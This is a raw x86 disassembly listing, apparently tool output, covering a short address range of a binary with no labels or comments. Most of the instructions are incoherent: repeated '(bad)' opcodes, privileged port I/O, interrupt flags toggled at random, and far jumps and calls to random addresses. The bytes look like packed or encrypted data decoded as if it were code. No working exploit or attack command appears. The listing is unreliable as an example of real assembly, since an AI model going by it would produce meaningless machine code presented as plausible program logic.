  41e7e7:	adc    BYTE PTR [ebx],ah
  41e7e9:	adc    eax,0xae606902
  41e7ee:	and    al,0x9f
  41e7f0:	shr    BYTE PTR [eax],1
  41e7f2:	add    al,cl
  41e7f4:	and    al,BYTE PTR [edi]
  41e7f6:	adc    eax,0x6d89add8
  41e7fb:	mov    al,0xba
  41e7fd:	jnp    0x41e833
  41e7ff:	mov    al,BYTE PTR [ebx]
  41e801:	dec    edx
  41e802:	xchg   ecx,eax
  41e803:	mov    ah,0xdf
  41e805:	pop    ebp
  41e806:	sar    BYTE PTR ss:[esi],0x34
  41e80a:	sti    
  41e80b:	jmp    0x71d512a9
  41e810:	xchg   edx,eax
  41e811:	jg     0x41e799
  41e813:	mov    ebx,0x20f456f7
  41e818:	test   al,0x66
  41e81a:	adc    DWORD PTR [eax-0x23],ebp
  41e81d:	mov    ds:0x562ccbd1,eax
  41e822:	outs   dx,DWORD PTR ds:[esi]
  41e823:	add    edi,ecx
  41e825:	adc    dl,BYTE PTR [ecx]
  41e827:	pop    esi
  41e828:	or     al,0x82
  41e82a:	mov    eax,ds:0xea355fd2
  41e82f:	xchg   BYTE PTR [edx],ch
  41e831:	rol    DWORD PTR [ecx],1
  41e833:	push   0xffffffc2
  41e835:	std    
  41e836:	loop   0x41e85d
  41e838:	mov    dl,al
  41e83a:	cmp    al,0xb4
  41e83c:	ror    cl,0xf0
  41e83f:	(bad)  
  41e840:	js     0x41e825
  41e842:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e843:	mov    al,ds:0xbc16853e
  41e848:	and    bl,dl
  41e84a:	mov    ds:0xa723d0b1,eax
  41e84f:	cli    
  41e850:	xchg   ebp,eax
  41e851:	outs   dx,DWORD PTR ds:[esi]
  41e852:	inc    esp
  41e853:	test   DWORD PTR [edi+0x678bb193],esi
  41e859:	cdq    
  41e85a:	in     al,0xe
  41e85c:	xchg   esp,eax
  41e85d:	jb     0x41e829
  41e85f:	fild   DWORD PTR [ebx+0x4b]
  41e862:	jb     0x41e838
  41e864:	retf   0xbf02
  41e867:	inc    eax
  41e868:	fist   WORD PTR [ecx]
  41e86a:	mov    ds:0xf61c37c8,eax
  41e86f:	(bad)  
  41e870:	mov    ds:0x200087f3,al
  41e875:	mov    cl,0xe5
  41e877:	cmp    ebx,DWORD PTR [ebp+0x46]
  41e87a:	repz push ecx
  41e87c:	or     ecx,DWORD PTR [edx]
  41e87e:	push   ebp
  41e87f:	test   eax,0xca9c5bfb
  41e884:	or     eax,0xb1eabc36
  41e889:	jne    0x41e8db
  41e88b:	int    0x14
  41e88d:	xor    al,al
  41e88f:	sbb    DWORD PTR [ebx-0x6e],ecx
  41e892:	sbb    BYTE PTR [ebp+0x6532adca],al
  41e898:	je     0x41e880
  41e89a:	or     dh,BYTE PTR [eax]
  41e89c:	fisubr WORD PTR [ecx]
  41e89e:	and    cl,BYTE PTR [ebx+0x194ccf7]
  41e8a4:	cmp    DWORD PTR [eax+0x53],ebx
  41e8a7:	xor    BYTE PTR [ebp-0x60],ah
  41e8aa:	jno    0x41e91c
  41e8ac:	and    eax,0x7c62550c
  41e8b1:	inc    ecx
  41e8b2:	arpl   WORD PTR [eax+0x32],si
  41e8b5:	inc    ecx
  41e8b6:	addr16 inc edx
  41e8b8:	xlat   BYTE PTR ds:[ebx]
  41e8b9:	bound  edx,QWORD PTR [ecx]
  41e8bb:	jecxz  0x41e8d8
  41e8bd:	add    esi,DWORD PTR [edi]
  41e8bf:	push   ss
  41e8c0:	cmp    BYTE PTR [eax+ebx*4+0x6b],0x54
  41e8c5:	add    DWORD PTR [ebp+0x2d],eax
  41e8c8:	ret    0xe55f
  41e8cb:	clc    
  41e8cc:	pop    esp
  41e8cd:	out    0x54,al
  41e8cf:	push   edx
  41e8d0:	imul   DWORD PTR [eax-0x43]
  41e8d3:	cmp    eax,0x35fbef42
  41e8d8:	in     al,0xb1
  41e8da:	jge    0x41e860
  41e8dc:	popf   
  41e8dd:	scas   eax,DWORD PTR es:[edi]
  41e8de:	cwde   
  41e8df:	imul   esp,DWORD PTR [esi],0xffffff95
  41e8e2:	mov    cl,0x79
  41e8e4:	jmp    0x41e944
  41e8e6:	aaa    
  41e8e7:	mov    bh,0x9b
  41e8e9:	xlat   BYTE PTR ds:[ebx]
  41e8ea:	loopne 0x41e96b
  41e8ec:	add    ebp,DWORD PTR [edi+0x6a146999]
  41e8f2:	xor    al,0xfb
  41e8f4:	or     ch,BYTE PTR [ebx-0x4]
  41e8f7:	dec    eax
  41e8f8:	cmp    al,0xcf
  41e8fa:	adc    al,0x6d
  41e8fc:	push   ss
  41e8fd:	shl    BYTE PTR [esi+0x41],cl
  41e900:	mov    cl,0xe0
  41e902:	ficom  WORD PTR [ebx]
  41e904:	dec    edx
  41e905:	pop    ebp
  41e906:	scas   al,BYTE PTR es:[edi]
  41e907:	loop   0x41e8d6
  41e909:	shl    BYTE PTR [edi+esi*1-0x29da6285],0xd1
  41e911:	sbb    bh,dh
  41e913:	pop    edi
  41e914:	pop    es
  41e915:	test   al,0x9b
  41e917:	lock outs dx,BYTE PTR ds:[esi]
  41e919:	sub    al,0x71
  41e91b:	ja     0x41e952
  41e91d:	xor    BYTE PTR [esi-0x4c],0x33
  41e921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e922:	out    dx,al
  41e923:	pop    edi
  41e924:	sar    BYTE PTR [bx],0xd9
  41e928:	pop    esi
  41e929:	mov    ebx,0xd52feb1d
  41e92e:	cmpxchg BYTE PTR [edx+0x76],bl
  41e932:	lock outs dx,BYTE PTR ds:[esi]
  41e934:	pop    edi
  41e935:	xchg   edx,eax
  41e936:	and    esi,DWORD PTR [ebx]
  41e938:	inc    esp
  41e939:	retf   0xab12
  41e93c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e93d:	out    dx,eax
  41e93e:	retf   0x3f70
  41e941:	addr16 and ah,dh
  41e944:	jmp    0x726f:0xe3e8a254
  41e94b:	clc    
  41e94c:	test   eax,0xdc9c5a1a
  41e951:	sub    eax,0xc057987
  41e956:	jne    0x41e9d1
  41e958:	sub    ch,BYTE PTR [edx-0x3106e601]
  41e95e:	addr16 push 0x744e82d3
  41e964:	inc    edi
  41e965:	xor    BYTE PTR [edx+0x42827580],bh
  41e96b:	iret   
  41e96c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e96d:	and    ebx,DWORD PTR [edi-0x3b]
  41e970:	ret    
  41e971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e972:	pop    ds
  41e973:	jb     0x41e9e3
  41e975:	loopne 0x41e93c
  41e977:	add    al,BYTE PTR [edx-0x69]
  41e97a:	int    0xbf
  41e97c:	cs inc ebx
  41e97e:	jbe    0x41e9c0
  41e980:	mov    esi,gs
  41e982:	(bad)  
  41e983:	(bad)  
  41e984:	sub    ebp,DWORD PTR [ecx-0x1ecce359]
  41e98a:	pushf  
  41e98b:	or     cl,0xc7
  41e98e:	out    0x14,al
  41e990:	xor    eax,0xd71a23ba
  41e995:	xor    BYTE PTR [ebx+0x31],cl
  41e998:	out    0xcb,eax
  41e99a:	popa   
  41e99b:	or     ebx,DWORD PTR [esi+0x7a]
  41e99e:	sti    
  41e99f:	icebp  
  41e9a0:	jmp    0x33a25b23
  41e9a5:	push   ebp
  41e9a6:	outs   dx,DWORD PTR ds:[esi]
  41e9a7:	adc    dh,0xaa
  41e9aa:	push   esp
  41e9ab:	adc    DWORD PTR [edx-0x7588a739],edi
  41e9b1:	fsubr  DWORD PTR [edx+edi*1-0x46]
  41e9b5:	dec    ebx
  41e9b6:	in     eax,dx
  41e9b7:	dec    edi
  41e9b8:	mov    BYTE PTR [edi+ebp*1+0x73dfe08b],bh
  41e9bf:	xchg   DWORD PTR gs:[edi],ebp
  41e9c2:	xchg   ebp,eax
  41e9c3:	not    DWORD PTR [edx-0x60a368b0]
  41e9c9:	stc    
  41e9ca:	fldcw  WORD PTR [edx]
  41e9cc:	in     al,dx
  41e9cd:	jb     0x41e9fd
  41e9cf:	lods   eax,DWORD PTR ds:[esi]
  41e9d0:	sbb    eax,0x25589eea
  41e9d5:	ds jb  0x41e9c0
  41e9d8:	dec    eax
  41e9d9:	jns    0x41e9cd
  41e9db:	je     0x41e9c8
  41e9dd:	inc    eax
  41e9de:	pop    esi
  41e9df:	retf   0x93d8
  41e9e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9e4:	mov    esi,0xc9a2e640
  41e9e9:	mov    dh,0x20
  41e9eb:	lahf   
  41e9ec:	imul   BYTE PTR cs:[eax+0x33]
  41e9f0:	lahf   
  41e9f1:	mov    eax,ds:0x95c2814b
  41e9f6:	shl    edx,1
  41e9f8:	sub    DWORD PTR [ebp-0x559281bd],0xffffff92
  41e9ff:	sub    DWORD PTR [esp+esi*8],ecx
  41ea02:	xchg   BYTE PTR ds:0x605cf1d,bl
  41ea08:	out    dx,al
  41ea09:	mov    ds:0xa88a1dfa,al
  41ea0e:	dec    ebp
  41ea0f:	ror    DWORD PTR [ecx],cl
  41ea11:	inc    esi
  41ea12:	lods   eax,DWORD PTR ds:[esi]
  41ea13:	fisubr DWORD PTR [edx]
  41ea15:	shl    bl,1
  41ea17:	popa   
  41ea18:	sti    
  41ea19:	imul   edx,ecx,0x622f38dc
  41ea1f:	inc    esp
  41ea20:	scas   eax,DWORD PTR es:[edi]
  41ea21:	test   DWORD PTR [eax-0x42ca414d],edx
  41ea27:	mov    al,ds:0x23f70cc2
  41ea2c:	shl    bl,1
  41ea2e:	in     al,0xb5
  41ea30:	and    BYTE PTR [ecx+0x28],ah
  41ea33:	dec    edi
  41ea34:	cld    
  41ea35:	out    0x5d,al
  41ea37:	xor    DWORD PTR [ebx+0x5de1f5a1],ebx
  41ea3d:	adc    al,0x4f
  41ea3f:	mov    bl,0x89
  41ea41:	lods   al,BYTE PTR ds:[esi]
  41ea42:	and    edx,ecx
  41ea44:	push   ebp
  41ea45:	lock addr16 rol ebx,cl
  41ea49:	test   DWORD PTR [esi],0x58a2f6ce
  41ea4f:	xchg   ebx,eax
  41ea50:	push   cs
  41ea51:	shl    edx,0xe6
  41ea54:	sub    DWORD PTR ds:0xaf46549,ecx
  41ea5a:	jle    0x41ead7
  41ea5c:	fs pop ecx
  41ea5e:	jle    0x41ea2a
  41ea60:	sub    cl,BYTE PTR [ecx+edi*8+0x7]
  41ea64:	das    
  41ea65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea66:	outs   dx,DWORD PTR ds:[esi]
  41ea67:	mov    cl,0x2a
  41ea69:	push   esp
  41ea6a:	arpl   si,dx
  41ea6c:	jbe    0x41eabe
  41ea6e:	inc    edi
  41ea6f:	inc    edi
  41ea70:	jle    0x41ea10
  41ea72:	bound  edi,QWORD PTR [eax+0x76]
  41ea75:	in     al,0x10
  41ea77:	inc    ebx
  41ea78:	inc    esi
  41ea79:	test   DWORD PTR [ebx-0x7ed48522],ebx
  41ea7f:	dec    ebx
  41ea80:	mov    WORD PTR [eax-0x7329c489],?
  41ea86:	xor    al,bh
  41ea88:	bound  edi,QWORD PTR [ebp-0x7e]
  41ea8b:	inc    ebp
  41ea8c:	pop    edi
  41ea8d:	test   ch,cl
  41ea8f:	pushf  
  41ea90:	in     al,dx
  41ea91:	mov    ebx,0x9d8d7eed
  41ea96:	dec    eax
  41ea97:	pusha  
  41ea98:	jg     0x41ea95
  41ea9a:	shl    BYTE PTR [ebp-0x6a984f60],1
  41eaa0:	add    al,0x31
  41eaa2:	loope  0x41ea84
  41eaa4:	imul   edx,DWORD PTR [edi+0x60],0x1b665f59
  41eaab:	mov    cl,0xc9
  41eaad:	sub    BYTE PTR es:[ebx+esi*2-0x44a7904a],bl
  41eab5:	shl    DWORD PTR [ebx],cl
  41eab7:	pop    ecx
  41eab8:	nop
  41eab9:	leave  
  41eaba:	fs ins BYTE PTR es:[edi],dx
  41eabc:	jnp    0x41eaa4
  41eabe:	stos   BYTE PTR es:[edi],al
  41eabf:	jb     0x41eb30
  41eac1:	or     edi,DWORD PTR [eax]
  41eac3:	add    bh,BYTE PTR [esi+0x3]
  41eac6:	(bad)  
  41eac7:	mov    cl,0xec
  41eac9:	lods   al,BYTE PTR ds:[esi]
  41eaca:	int    0x3
  41eacc:	repnz xor al,0x59
  41eacf:	xlat   BYTE PTR ds:[ebx]
  41ead0:	popf   
  41ead1:	mov    cl,0x4d
  41ead3:	xor    bh,BYTE PTR [edx+0x3314ada1]
  41ead9:	mov    eax,0xd1413c0e
  41eade:	stos   BYTE PTR es:[edi],al
  41eadf:	mov    ebx,0x741c7f8c
  41eae4:	mov    al,ds:0x2260e245
  41eae9:	aam    0xe3
  41eaeb:	or     BYTE PTR [esi],al
  41eaed:	add    DWORD PTR [ebx+0x6b],esp
  41eaf0:	jae    0x41eaa7
  41eaf2:	lods   al,BYTE PTR ds:[esi]
  41eaf3:	xlat   BYTE PTR ds:[ebx]
  41eaf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eaf5:	cmp    DWORD PTR ss:[esi],ebx
  41eaf8:	shr    bl,1
  41eafa:	fsub   DWORD PTR ds:0x3b77ed8b
  41eb00:	push   edx
  41eb01:	pop    edi
  41eb02:	(bad)  [ebp+0x75566c4f]
  41eb08:	mov    eax,0x8b29dec4
  41eb0d:	or     ch,BYTE PTR [edi]
  41eb0f:	int3   
  41eb10:	daa    
  41eb11:	mov    ds:0x301f969a,al
  41eb16:	cmp    al,0xf
  41eb18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb19:	pop    edi
  41eb1a:	test   DWORD PTR [esi],ebp
  41eb1c:	mov    eax,ds:0xd74e566b
  41eb21:	shr    BYTE PTR [edi+0x77fdc1f7],cl
  41eb27:	and    BYTE PTR [eax+0x4f],ah
  41eb2a:	cmp    eax,0xd6c6f1a6
  41eb2f:	call   0xe7a6fb47
  41eb34:	sub    bh,al
  41eb36:	leave  
  41eb37:	mov    edi,0x4e3b4162
  41eb3c:	iret   
  41eb3d:	popf   
  41eb3e:	lds    ebp,FWORD PTR [edi-0x40]
  41eb41:	add    DWORD PTR [ebp-0x73888192],edx
  41eb47:	outs   dx,BYTE PTR ds:[esi]
  41eb48:	scas   eax,DWORD PTR es:[edi]
  41eb49:	scas   eax,DWORD PTR es:[edi]
  41eb4a:	lods   eax,DWORD PTR ds:[esi]
  41eb4b:	or     al,0x6a
  41eb4d:	dec    esi
  41eb4e:	add    BYTE PTR [esi],al
  41eb50:	mov    ebx,0xfb8aed41
  41eb55:	fwait
  41eb56:	pop    ebx
  41eb57:	mov    ebx,0x49d257d1
  41eb5c:	push   esi
  41eb5d:	popa   
  41eb5e:	scas   al,BYTE PTR es:[edi]
  41eb5f:	and    bh,dh
  41eb61:	mov    eax,0x654a39d9
  41eb66:	dec    esp
  41eb67:	jns    0x41eb11
  41eb69:	in     al,0xc9
  41eb6b:	imul   eax,DWORD PTR [edx-0x52],0x136010e1
  41eb72:	in     eax,dx
  41eb73:	stc    
  41eb74:	les    esp,FWORD PTR [edx]
  41eb76:	push   esi
  41eb77:	sub    bl,BYTE PTR [ebx+eiz*2+0x350be54d]
  41eb7e:	dec    ebx
  41eb7f:	repz cmp BYTE PTR [ebx+0x73ca7eaf],bh
  41eb86:	xchg   ebx,eax
  41eb87:	stos   DWORD PTR es:[edi],eax
  41eb88:	lahf   
  41eb89:	push   esp
  41eb8a:	add    esp,DWORD PTR [ebx+0x2a]
  41eb8d:	inc    esi
  41eb8e:	jl     0x41eb39
  41eb90:	call   0xa1f5:0x79a318a9
  41eb97:	xor    al,0xe4
  41eb99:	cld    
  41eb9a:	xchg   DWORD PTR [esi-0x3b],edi
  41eb9d:	repz pop ds
  41eb9f:	xchg   ecx,eax
  41eba0:	jae    0x41eb8f
  41eba2:	xor    DWORD PTR [edx+0x49],ebx
  41eba5:	xchg   edx,eax
  41eba6:	sub    eax,0xb552b4bd
  41ebab:	xchg   ebx,eax
  41ebac:	in     al,0x4c
  41ebae:	call   0xf6046ac3
  41ebb3:	ins    BYTE PTR es:[edi],dx
  41ebb4:	fs pop eax
  41ebb6:	sbb    DWORD PTR [edi-0x6a],edi
  41ebb9:	std    
  41ebba:	inc    eax
  41ebbb:	fwait
  41ebbc:	jns    0x41eb62
  41ebbe:	and    ecx,DWORD PTR [edx+eax*8-0x3f]
  41ebc2:	fisttp QWORD PTR [ebx+0x53a0cc7e]
  41ebc8:	xor    eax,edi
  41ebca:	cmp    esi,ebp
  41ebcc:	pop    edx
  41ebcd:	leave  
  41ebce:	adc    DWORD PTR [eax-0x23],edi
  41ebd1:	cwde   
  41ebd2:	push   ecx
  41ebd3:	xor    al,0x51
  41ebd5:	mov    edi,0xd3a2c4ec
  41ebda:	xlat   BYTE PTR ds:[ebx]
  41ebdb:	cwde   
  41ebdc:	push   ecx
  41ebdd:	dec    edi
  41ebde:	pop    eax
  41ebdf:	sti    
  41ebe0:	pop    eax
  41ebe1:	push   esp
  41ebe2:	lock popf 
  41ebe4:	sbb    bh,bh
  41ebe6:	push   es
  41ebe7:	stos   BYTE PTR es:[edi],al
  41ebe8:	stos   DWORD PTR es:[edi],eax
  41ebe9:	out    0x3b,eax
  41ebeb:	jge    0x41ec3e
  41ebed:	mov    dh,0x36
  41ebef:	inc    eax
  41ebf0:	pop    ss
  41ebf1:	and    al,0xe6
  41ebf3:	sub    DWORD PTR [edi-0x74714a46],edx
  41ebf9:	mov    ebx,cs
  41ebfb:	sbb    eax,0x2ebe34f1
  41ec00:	aad    0xc
  41ec02:	test   BYTE PTR [ecx],dl
  41ec04:	jns    0x41eb97
  41ec06:	loop   0x41ebae
  41ec08:	mov    ebp,0x4f8cfe5d
  41ec0d:	mov    ah,0xf0
  41ec0f:	push   esp
  41ec10:	xchg   ebx,eax
  41ec11:	cld    
  41ec12:	jle    0x41ec72
  41ec14:	inc    ebx
  41ec15:	bound  esi,QWORD PTR [esi+ecx*4-0x34b8e296]
  41ec1c:	daa    
  41ec1d:	push   edi
  41ec1e:	mov    ds:0x83fb00a9,al
  41ec23:	in     al,dx
  41ec24:	xor    esi,DWORD PTR [esi-0x6f]
  41ec27:	push   ecx
  41ec28:	jp     0x41ec2c
  41ec2a:	fisttp WORD PTR [ecx-0xa]
  41ec2d:	fistp  DWORD PTR [esi]
  41ec2f:	sbb    eax,0x7246cbd2
  41ec34:	mov    ds,WORD PTR [ecx+0x24]
  41ec37:	add    eax,0x92b36c21
  41ec3c:	xor    al,0xee
  41ec3e:	ins    DWORD PTR es:[edi],dx
  41ec3f:	fisttp QWORD PTR [ebp+0x6986bcfa]
  41ec45:	sbb    BYTE PTR [edi-0x69],bl
  41ec48:	bnd jle 0x7a45959f
  41ec4f:	jbe    0x41ec65
  41ec51:	jmp    FWORD PTR [ebx+0xfea6ab7]
  41ec57:	dec    edi
  41ec58:	push   0xc1af3c4c
  41ec5d:	mov    DWORD PTR [esi+0xb],edx
  41ec60:	cmp    BYTE PTR [edx-0x1d],cl
  41ec63:	hlt    
  41ec64:	imul   ebp,DWORD PTR ds:0xae061347,0x3203c7da
  41ec6e:	popf   
  41ec6f:	ins    DWORD PTR es:[edi],dx
  41ec70:	popa   
  41ec71:	xor    al,0x4a
  41ec74:	dec    eax
  41ec75:	mov    edi,0xe16fbd27
  41ec7a:	mov    al,0x83
  41ec7c:	loope  0x41ec30
  41ec7e:	and    ecx,ebx
  41ec80:	pushf  
  41ec81:	jle    0x41ec67
  41ec83:	and    eax,0x39242666
  41ec89:	push   0xf2b9481f
  41ec8e:	and    DWORD PTR [edx+0x4e],ebp
  41ec91:	shl    BYTE PTR [eax-0x2d],1
  41ec94:	outs   dx,DWORD PTR ds:[esi]
  41ec95:	jo     0x41eca3
  41ec97:	and    al,0x11
  41ec99:	ror    DWORD PTR [ebx],cl
  41ec9b:	sub    eax,0xdc8cb67f
  41eca0:	and    eax,0x5211ffe1
  41eca5:	ja     0x41eca4
  41eca7:	mov    ah,0x71
  41eca9:	int3   
  41ecaa:	push   eax
  41ecab:	stos   BYTE PTR es:[edi],al
  41ecac:	adc    BYTE PTR [edi+0x24],al
  41ecaf:	and    dh,BYTE PTR [eax-0x13]
  41ecb2:	push   0x19b04d33
  41ecb7:	ret    
  41ecb8:	inc    edx
  41ecb9:	ds retf 0x7e1e
  41ecbd:	pop    ds
  41ecbe:	in     al,0x11
  41ecc0:	bound  ebp,QWORD PTR [esi-0x14]
  41ecc3:	sbb    al,0xc6
  41ecc5:	hlt    
  41ecc6:	push   ebp
  41ecc7:	add    al,0xec
  41ecc9:	fistp  DWORD PTR [ebx+0x1b]
  41eccc:	in     eax,dx
  41eccd:	xor    eax,0x8316d556
  41ecd2:	jne    0x41ed10
  41ecd4:	enter  0x97fb,0x8d
  41ecd8:	push   ebx
  41ecd9:	dec    ebx
  41ecda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecdb:	dec    ecx
  41ecdc:	mov    esp,DWORD PTR [edi+0x21]
  41ecdf:	(bad)  
  41ece1:	pop    esi
  41ece2:	jae    0x41eca7
  41ece4:	add    al,0xe7
  41ece6:	pop    ss
  41ece7:	nop
  41ece8:	mov    DWORD PTR [edx+eiz*4-0x63],ebp
  41ecec:	cmc    
  41eced:	dec    edx
  41ecee:	and    al,0xd6
  41ecf0:	sbb    eax,esi
  41ecf2:	mov    esp,0x8431decd
  41ecf7:	addr16 cmp al,0x4e
  41ecfa:	outs   dx,DWORD PTR ds:[esi]
  41ecfb:	mov    DWORD PTR ds:0x5b2bdbba,esi
  41ed01:	or     ebx,esp
  41ed03:	test   eax,0xb67f545c
  41ed08:	and    DWORD PTR [ecx-0x14],ebx
  41ed0b:	push   ebx
  41ed0c:	adc    al,0xb9
  41ed0e:	ds pop ecx
  41ed10:	sbb    ch,BYTE PTR [ebx-0x56]
  41ed13:	in     eax,dx
  41ed14:	jnp    0x41ed15
  41ed16:	sub    cl,ch
  41ed18:	mov    ah,0xb4
  41ed1a:	pop    ss
  41ed1b:	sub    DWORD PTR [eax],esp
  41ed1d:	int    0xf0
  41ed1f:	rol    DWORD PTR [ebx+0x6f64c4b9],0x7
  41ed26:	(bad)  
  41ed28:	jo     0x41ed5d
  41ed2a:	cld    
  41ed2b:	sar    BYTE PTR [esi+0x5b],0x81
  41ed2f:	jns    0x41ecd7
  41ed31:	addr16 jmp 0x41ed89
  41ed34:	leave  
  41ed35:	adc    BYTE PTR [edx-0xe],dh
  41ed38:	inc    ebp
  41ed39:	ficomp WORD PTR [ecx]
  41ed3b:	rcr    DWORD PTR [eax+0x31],1
  41ed3e:	test   DWORD PTR [ebp+0x3372fdc3],edx
  41ed44:	push   0xda47113c
  41ed49:	sub    esi,DWORD PTR [eax-0x3c]
  41ed4c:	popf   
  41ed4d:	shl    cl,0xc5
  41ed50:	ja     0x41ed53
  41ed52:	in     eax,0xac
  41ed54:	add    edi,DWORD PTR [ebx]
  41ed56:	call   0x3d0b:0x58ee3c3a
  41ed5d:	inc    ebx
  41ed5e:	retf   
  41ed5f:	mov    ebp,ss
  41ed61:	pop    edx
  41ed62:	repz clc 
  41ed64:	(bad)  
  41ed65:	pop    es
  41ed66:	js     0x41ed1a
  41ed68:	push   ebx
  41ed69:	mov    esi,0x5eb58de0
  41ed6e:	shl    ch,0x73
  41ed71:	push   edx
  41ed72:	or     ebx,DWORD PTR [edi]
  41ed74:	mov    ebx,0x3ffa4d97
  41ed79:	jne    0x41edd2
  41ed7b:	fs ds ins DWORD PTR es:[edi],dx
  41ed7e:	mov    eax,ds:0xa09bf6f8
  41ed83:	adc    bh,BYTE PTR [edi-0x4eb5d2c0]
  41ed89:	pop    ebp
  41ed8a:	aam    0x1b
  41ed8c:	adc    ah,BYTE PTR [ebp-0x17]
  41ed8f:	xor    bl,BYTE PTR [edx-0x63]
  41ed92:	xchg   edx,eax
  41ed93:	sub    al,0x39
  41ed95:	ins    BYTE PTR es:[edi],dx
  41ed96:	call   DWORD PTR [ebx]
  41ed98:	or     BYTE PTR [ecx+edi*4],bl
  41ed9b:	sbb    eax,esi
  41ed9d:	ss or  eax,0x29a3267d
  41eda3:	jle    0x41edf2
  41eda5:	xor    al,BYTE PTR [edx+0x41]
  41eda8:	fadd   QWORD PTR [edi]
  41edaa:	push   es
  41edab:	cmp    ebp,DWORD PTR gs:[eax]
  41edae:	cli    
  41edaf:	mov    esi,0x436b8731
  41edb4:	(bad)  
  41edb5:	mov    dh,0xfe
  41edb7:	ficom  DWORD PTR [ebp-0x6d68f24a]
  41edbd:	xlat   BYTE PTR ds:[ebx]
  41edbe:	jecxz  0x41ed42
  41edc0:	shr    BYTE PTR [ecx+ebp*1-0x3488b181],1
  41edc7:	ror    BYTE PTR [esi-0x3c],cl
  41edca:	adc    al,0xa3
  41edcc:	push   edx
  41edcd:	bound  ebp,QWORD PTR [ecx]
  41edcf:	cmp    dl,BYTE PTR [eax-0x2e]
  41edd2:	push   ss
  41edd3:	ret    
  41edd4:	jge    0x41edbd
  41edd6:	xor    al,0x12
  41edd8:	imul   ebx,DWORD PTR [edi-0x7a],0x34
  41eddc:	lahf   
  41eddd:	push   eax
  41edde:	cmp    DWORD PTR [ebx],eax
  41ede0:	jno    0x41ee4a
  41ede2:	jne    0x41ed67
  41ede4:	sti    
  41ede5:	add    ah,BYTE PTR [edi-0x2efc84c5]
  41edeb:	dec    BYTE PTR [ebp+0x73]
  41edee:	xchg   esp,eax
  41edef:	jmp    0xd820:0xb72543f5
  41edf6:	dec    esp
  41edf7:	adc    al,0xf2
  41edf9:	sbb    al,0xb7
  41edfb:	lahf   
  41edfc:	mov    al,0xb5
  41edfe:	jge    0x41ee6c
  41ee00:	pop    ebx
  41ee01:	int    0x14
  41ee03:	mov    eax,0xf2388712
  41ee08:	aam    0xfa
  41ee0a:	out    dx,eax
  41ee0b:	test   al,0x8d
  41ee0d:	push   ecx
  41ee0e:	sbb    edi,DWORD PTR fs:[edx+0x6f108f27]
  41ee15:	push   es
  41ee16:	icebp  
  41ee17:	cwde   
  41ee18:	shr    BYTE PTR [edi-0x18],1
  41ee1b:	aaa    
  41ee1c:	sub    eax,0x90df1fa0
  41ee21:	cs push 0xffffffe2
  41ee24:	ins    DWORD PTR es:[edi],dx
  41ee25:	(bad)  
  41ee26:	lock out 0x68,al
  41ee29:	cmp    ebx,esi
  41ee2b:	add    al,BYTE PTR [eax+0x3ec5d3ca]
  41ee31:	ds loop 0x41ee12
  41ee34:	lods   al,BYTE PTR ds:[esi]
  41ee35:	dec    ebx
  41ee36:	pop    di
  41ee38:	adc    BYTE PTR [edx-0x38],cl
  41ee3b:	push   ds
  41ee3c:	int    0x34
  41ee3e:	cmp    al,0xcd
  41ee40:	loop   0x41ee29
  41ee42:	stos   DWORD PTR es:[edi],eax
  41ee43:	and    eax,0x5d9e5769
  41ee48:	bound  ecx,QWORD PTR [ebx]
  41ee4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee4b:	jb     0x41eeb3
  41ee4d:	and    eax,0x45d107c1
  41ee52:	jge    0x41eea7
  41ee54:	arpl   bp,si
  41ee56:	test   BYTE PTR [edx-0x6f],dl
  41ee59:	push   ecx
  41ee5a:	sub    eax,0x8763b74
  41ee5f:	mov    ds:0xe3233d37,al
  41ee64:	mov    dl,0x83
  41ee66:	fdivr  st,st(4)
  41ee68:	adc    cl,BYTE PTR [eax+0x105a1d9c]
  41ee6e:	arpl   bp,bx
  41ee70:	stos   DWORD PTR es:[edi],eax
  41ee71:	jmp    ecx
  41ee73:	cld    
  41ee74:	or     BYTE PTR [edi],ah
  41ee76:	sub    BYTE PTR [bp+si+0x26],dh
  41ee7a:	inc    ebx
  41ee7b:	push   ecx
  41ee7c:	iret   
  41ee7d:	gs mov WORD PTR fs:[esp+edi*2],gs
  41ee82:	(bad)  
  41ee84:	or     BYTE PTR [edx-0x72],cl
  41ee87:	or     al,0xf6
  41ee89:	mov    esp,?
  41ee8b:	stc    
  41ee8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee8d:	adc    dh,cl
  41ee8f:	lods   al,BYTE PTR ds:[esi]
  41ee90:	xchg   esi,eax
  41ee91:	out    0xb3,eax
  41ee93:	xchg   ebx,eax
  41ee94:	sbb    eax,0x52f767c1
  41ee99:	sbb    dh,BYTE PTR fs:0xe6805b98
  41eea0:	cs push ebp
  41eea2:	cmp    edx,DWORD PTR ds:0x68a59a57
  41eea8:	cmp    dh,bl
  41eeaa:	or     BYTE PTR [ebp-0x36],bl
  41eead:	cmp    al,BYTE PTR [esi]
  41eeaf:	xor    dh,ch
  41eeb1:	in     al,dx
  41eeb2:	ss imul edi,edx,0x90b5f307
  41eeb9:	mov    edx,0x205b8d8a
  41eebe:	stc    
  41eebf:	xchg   DWORD PTR [edi+0x79],edx
  41eec2:	std    
  41eec3:	scas   eax,DWORD PTR es:[edi]
  41eec4:	cld    
  41eec5:	(bad)  
  41eec6:	stc    
  41eec7:	aam    0xee
  41eec9:	xchg   ebx,eax
  41eeca:	adc    al,0xdc
  41eecc:	add    DWORD PTR [edx],edi
  41eece:	add    dl,BYTE PTR [eax+ecx*1]
  41eed1:	sbb    cl,BYTE PTR [ebx+0xed7dfe3]
  41eed7:	fnstenv [esi+eiz*4+0x4]
  41eedb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eedc:	pushf  
  41eedd:	sub    BYTE PTR [eax],cl
  41eedf:	sub    bl,BYTE PTR [ebx-0x3d]
  41eee2:	mov    al,ds:0x862732fe
  41eee7:	pop    eax
  41eee8:	ret    0x7753
